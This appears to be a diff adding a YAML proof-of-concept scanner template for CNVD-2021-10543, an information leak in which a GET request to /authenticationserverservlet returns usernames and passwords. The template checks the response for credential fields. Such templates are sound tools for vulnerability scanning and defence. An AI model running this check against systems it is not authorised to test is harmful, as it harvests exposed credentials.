@@ -1,0 +1,12 @@
+name: poc-yaml-eea-info-leak-cnvd-2021-10543
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /authenticationserverservlet
+        expression: response.status == 200 && "<username>(.*?)</username>".bmatches(response.body) && "<password>(.*?)</password>".bmatches(response.body)
+expression: r0()
+detail:
+    links:
+        - https://exp1orer.github.io
